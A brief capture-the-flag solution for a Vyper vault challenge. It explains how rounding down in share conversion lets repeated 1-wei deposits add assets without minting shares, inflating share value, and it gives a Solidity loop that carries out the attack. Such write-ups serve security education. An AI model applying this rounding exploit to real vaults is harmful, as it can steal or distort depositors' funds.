# qzpm - Solution

## Find the vulnerability

The objective here is `self._convertToAssets(1) > 20` that is a share is more than 20 assets in value. To achieve this we certainly must deposit somethng so start from `deposit` function that calls `_convertToShares` with `_ceil` false.

So `return total_shares * assets / total_assets` will be `1 * assets / 2`. It means that depositing 1 wei will increment assets but not shares because `1 * 1 / 2 = 0`. Doing this 19 times and bingo!

`_convertToAssets` will return `return shares * (total_assets + 2) / (total_shares + 1)` that is `(19 + 2) / (0 + 1)`.

## Exploit the contract

```solidity
assetToken.faucet(address(this), type(uint256).max);
assetToken.approve(address(vyperSecureumCTF), type(uint256).max);

for (uint256 i = 0; i < 19; i++) {
    vyperSecureumCTF.deposit(1, address(this));
}
```
